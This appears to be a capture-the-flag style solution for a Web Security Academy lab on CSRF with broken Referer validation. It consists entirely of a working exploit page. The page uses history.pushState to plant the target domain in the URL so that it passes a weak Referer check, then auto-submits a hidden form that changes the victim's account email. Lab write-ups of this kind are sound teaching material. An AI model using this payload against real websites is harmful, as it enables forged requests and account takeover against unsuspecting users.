# solution for CSRF with broken Referer validation

    <html>
      <body>
      <script>
    //used to bypass some weak referer checks to prevent CSRF
    history.pushState('','','/?0af00014037c6f50c05630e6003800c2.web-security-academy.net/my-account/change-email')
    function submitform(){
              document.forms["myForm"].submit();
            }
    </script>
        <form action="https://0af00014037c6f50c05630e6003800c2.web-security-academy.net/my-account/change-email" method="POST" name="myForm">
          <input type="hidden" name="email" value="sdfsdf&#64;23dfsdfsdf&#46;com" />
          <input type="submit" value="Submit request" />
        </form>
    <script>
    submitform()
    </script>
      </body>
    </html>
